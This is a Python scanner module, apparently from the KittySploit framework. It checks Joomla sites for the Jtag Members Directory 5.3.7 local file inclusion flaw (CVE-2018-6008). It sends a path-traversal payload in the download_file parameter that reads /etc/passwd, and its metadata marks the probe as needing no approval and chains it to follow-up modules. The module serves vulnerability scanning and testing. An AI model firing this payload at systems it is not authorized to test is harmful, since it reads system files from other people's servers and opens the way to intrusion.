#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Joomla! Jtag Members Directory 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Jtag Members Directory 5.3.7 - Local File Inclusion Detection',
        'description': 'Joomla! Jtag Members Directory 5.3.7 is vulnerable to local file inclusion via the download_file parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'joomla', 'lfi', 'edb', 'packetstorm', 'joomlatag', 'joomla\\!', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/43913',
            'https://packetstormsecurity.com/files/146137/Joomla-Jtag-Members-Directory-5.3.7-Arbitrary-File-Download.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-6008',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2018-6008',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Jtag Members Directory 5.3.7 - Local File Inclusion detected",
                path='/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

